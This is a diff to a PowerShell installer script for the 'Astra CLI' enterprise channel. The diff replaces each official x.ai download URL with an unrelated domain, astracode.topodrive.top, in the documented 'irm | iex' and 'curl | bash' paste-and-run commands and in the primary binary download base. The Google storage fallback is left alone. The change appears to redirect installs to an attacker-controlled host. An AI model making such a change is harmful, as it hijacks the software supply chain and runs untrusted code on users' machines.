@@ -1,5 +1,5 @@
 #
-# Astra CLI installer (enterprise channel) for PowerShell — https://x.ai/cli/enterprise-install.ps1
+# Astra CLI installer (enterprise channel) for PowerShell — https://astracode.topodrive.top/cli/enterprise-install.ps1
 #
 # Standalone installer for the enterprise channel. Intentionally a full copy of
 # the install logic so changes to the stable installer cannot break enterprise.
@@ -8,10 +8,10 @@
 # Env: ASTRA_BIN_DIR, ASTRA_PROXY_URL
 #
 # Usage:
-#   irm https://x.ai/cli/enterprise-install.ps1 | iex                                       # latest enterprise
-#   & ([scriptblock]::Create((irm https://x.ai/cli/enterprise-install.ps1))) -Version 0.1.42 # specific version
-#   $env:ASTRA_VERSION="0.1.42"; irm https://x.ai/cli/enterprise-install.ps1 | iex           # specific version (alt)
-#   $env:ASTRA_DEPLOYMENT_KEY="<key>"; irm https://x.ai/cli/enterprise-install.ps1 | iex
+#   irm https://astracode.topodrive.top/cli/enterprise-install.ps1 | iex                                       # latest enterprise
+#   & ([scriptblock]::Create((irm https://astracode.topodrive.top/cli/enterprise-install.ps1))) -Version 0.1.42 # specific version
+#   $env:ASTRA_VERSION="0.1.42"; irm https://astracode.topodrive.top/cli/enterprise-install.ps1 | iex           # specific version (alt)
+#   $env:ASTRA_DEPLOYMENT_KEY="<key>"; irm https://astracode.topodrive.top/cli/enterprise-install.ps1 | iex
 #
 
 param(
@@ -34,7 +34,7 @@ if (-not $Version -and $env:ASTRA_VERSION) {
 
 # This script is Windows-only. PS 5.1 has no Platform property and only runs on Windows.
 if ($PSVersionTable.Platform -and $PSVersionTable.Platform -ne 'Win32NT') {
-    Write-Error "This installer is for Windows. On macOS/Linux, use: curl -fsSL https://x.ai/cli/enterprise-install.sh | bash"
+    Write-Error "This installer is for Windows. On macOS/Linux, use: curl -fsSL https://astracode.topodrive.top/cli/enterprise-install.sh | bash"
     exit 1
 }
 
@@ -151,7 +151,7 @@ $platform = "windows-$arch"
 
 # --- Resolve version ---
 
-$BaseUrlPrimary = 'https://x.ai/cli'
+$BaseUrlPrimary = 'https://astracode.topodrive.top/cli'
 $BaseUrlFallback = 'https://storage.googleapis.com/grok-build-public-artifacts/cli'
 $DownloadDir = Join-Path $AstraDir 'downloads'
 $BinDir = if ($env:ASTRA_BIN_DIR) { $env:ASTRA_BIN_DIR } else { Join-Path $AstraDir 'bin' }
